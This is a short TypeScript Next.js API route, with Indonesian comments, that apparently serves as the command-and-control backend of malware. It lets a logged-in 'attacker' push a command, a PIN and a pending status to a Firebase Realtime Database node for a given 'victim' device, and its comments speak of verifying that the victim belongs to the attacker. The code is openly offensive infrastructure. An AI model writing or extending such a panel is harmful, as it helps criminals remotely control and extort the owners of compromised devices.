import { rtdb } from "@/lib/firebase";
import { ref, set } from "firebase/database";

export async function POST(
  req: NextRequest,
  { params }: { params: { victimId: string } }
) {
  const session = await getServerSession();
  if (!session?.user?.id) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { command, pin } = await req.json();
  const victimId = params.victimId;

  // Verifikasi bahwa victim ini milik attacker ini (query Firestore)
  // ...

  // Kirim perintah ke Realtime DB node victim/commands
  const commandRef = ref(rtdb, `victims/${victimId}/command`);
  await set(commandRef, {
    action: command,
    timestamp: Date.now(),
    pin: pin || "",
    status: "pending",
  });

  return NextResponse.json({ success: true });
}
